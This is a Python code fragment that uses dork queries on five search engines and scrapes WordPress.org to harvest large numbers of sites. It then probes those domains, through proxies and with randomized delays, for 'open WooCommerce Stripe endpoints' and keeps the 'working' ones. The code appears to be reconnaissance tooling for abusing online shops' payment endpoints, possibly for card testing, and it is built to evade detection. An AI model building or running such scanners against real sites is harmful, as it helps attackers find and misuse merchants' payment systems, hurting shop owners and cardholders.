    async with aiohttp.ClientSession(connector=connector) as session:

        # Run ALL engines in parallel per batch
        logger.info("Starting parallel multi-engine search...")

        async def run_engine(name: str, coro_fn, dorks: list, max_per: int = 20):
            """Run one search engine across dorks — more dorks for larger count."""
            engine_urls = []
            # Scale how many dorks we use based on requested count
            n_dorks = min(len(dorks), max(3, count // 30))
            selected_dorks = random.sample(dorks, n_dorks) if n_dorks < len(dorks) else dorks
            for dork in selected_dorks:
                try:
                    per_query = max(20, count // max(n_dorks, 1))
                    results = await coro_fn(session, dork, proxy_kwargs, per_query)
                    new = [u for u in results if u not in all_urls]
                    all_urls.update(new)
                    engine_urls.extend(new)
                    if progress_cb:
                        await progress_cb(len(all_urls), count)
                    await asyncio.sleep(random.uniform(1.0, 2.5))
                except Exception as e:
                    logger.debug(f"{name} dork error: {e}")
            logger.info(f"{name} total: {len(engine_urls)} new sites")
            return engine_urls

        # Run Google, Bing, Yahoo, DDG, Yandex in PARALLEL
        tasks = [
            run_engine("Google",  _google_search,  GOOGLE_DORKS,  25),
            run_engine("Bing",    _bing_search,    BING_DORKS,    25),
            run_engine("Yahoo",   _yahoo_search,   YAHOO_DORKS,   20),
            run_engine("DDG",     _ddg_search,     DDG_DORKS,     20),
            run_engine("Yandex",  _yandex_search,  YANDEX_DORKS,  15),
        ]
        engine_results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in engine_results:
            if isinstance(res, list):
                found_list.extend(res)

        # WordPress.org mining
        wp_urls = await _scrape_wordpress_org(session, proxy_kwargs)
        new_wp  = [u for u in wp_urls if u not in all_urls]
        all_urls.update(new_wp)
        found_list.extend(new_wp)
        if progress_cb:
            await progress_cb(len(all_urls), count)

    # Final dedup + shuffle — NO cap (return all found, caller can slice)
    seen_final: set[str] = set()
    unique: list[str] = []
    for u in found_list:
        if u not in seen_final:
            seen_final.add(u)
            unique.append(u)

    random.shuffle(unique)
    # Only cap if count is reasonable, otherwise return everything found
    if count < 500:
        unique = unique[:count]
    logger.info(f"Discovery done: {len(unique)} unique sites from {len(all_urls)} total found")
    return unique


# ── Fast batch WooCommerce prober ─────────────────────────────────────────────
async def fast_woocommerce_scan(
    domains: list[str],
    proxy: dict = None,
    progress_cb=None,
) -> list[dict]:
    """Probe list of domains for open WooCommerce Stripe endpoints."""
    working: list[dict] = []
    done    = 0
    sem     = asyncio.Semaphore(10)

    proxy_kwargs = {}
    if proxy:
        from core.proxy_manager import get_connector, get_proxy_kwargs
        connector    = get_connector(proxy)
        proxy_kwargs = get_proxy_kwargs(proxy)
    else:
        connector = aiohttp.TCPConnector(ssl=False, limit=10)

    async with aiohttp.ClientSession(connector=connector) as session:

        async def probe(domain: str):
            nonlocal done
            async with sem:
                result = await probe_woocommerce_endpoint(session, domain, proxy_kwargs)
                if result:
                    working.append(result)
                done += 1
                if progress_cb:
                    await progress_cb(done, len(domains), len(working))

        await asyncio.gather(*[probe(d) for d in domains])

    logger.info(f"Fast WC scan: {len(working)}/{len(domains)} working")
    return working
